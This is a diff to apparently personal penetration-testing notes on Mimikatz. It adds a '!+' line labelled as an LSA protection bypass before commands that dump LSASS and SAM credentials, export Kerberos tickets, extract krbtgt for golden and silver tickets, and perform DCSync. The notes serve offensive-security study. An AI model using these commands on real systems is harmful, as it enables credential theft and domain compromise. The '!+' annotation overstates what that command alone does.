@@ -26,6 +26,7 @@ sekurlsa::logonpasswords
 ```powershell
 privilege::debug # enables the _SeDebugPrivilge_ access right
 token::elevate # elevate the security token Administrator -> SYSTEM
+!+ # LSA protection bypass!
 lsadump::lsa /patch
 lsadump::sam
 sekurlsa::logonPasswords
@@ -36,7 +37,7 @@ sekurlsa::logonPasswords
 ```powershell
 privilege::debug
 token::elevate
-
+!+ # LSA protection bypass!
 lsadump::lsa /patch
 lsadump::sam # Dump SAM database
 ```
@@ -46,7 +47,7 @@ lsadump::sam # Dump SAM database
 ```powershell
 privilege::debug
 token::elevate
-
+!+ # LSA protection bypass!
 sekurlsa::msv
 ```
 These hashes can be used to perform [[Pass-The-Hash]] attacks by using `mimikatz` to inject an access token for the vicitim user on any command!
@@ -61,6 +62,7 @@ Used in [[Attacking-Kerberos]] see the detailed mechanics of Kerberos and [[Acti
 Sometimes extraction of Kerberos tickets and sessions keys from LSASS memory with Mimikatz, requiring also SYSTEM privileges:
 ```powershell
 privilege::debug
+!+ # LSA protection bypass!
 sekurlsa::tickets /export
 ```
 Extract a desired ticket and inject the tickets into the current session, which doesn't require administrator privileges:
@@ -93,12 +95,14 @@ kerberos::golden /user:$user /domain:$domain.com /sid:$SID-minus-exception /targ
 Don't be confused `kerberos::golden` is for Silver Ticket Attacks
 ```powershell
 privilege::debug
+!+ # LSA protection bypass!
 lsadump::lsa /inject /name:krbtgt
 ```
 
 With Domain Admin group access:
 ```powershell
 privilege::debug
+!+ # LSA protection bypass!
 lsadump::lsa /patch
 # Look for krbtgt
 ```
@@ -121,5 +125,6 @@ Mimikatz provides two sets of default values when using the golden ticket option
 Visit [[Active-Directory-Persistence]] for details.
 
 ```powershell
+!+ # LSA protection bypass!
 lsadump::dcsync /user:Administrator
 ```
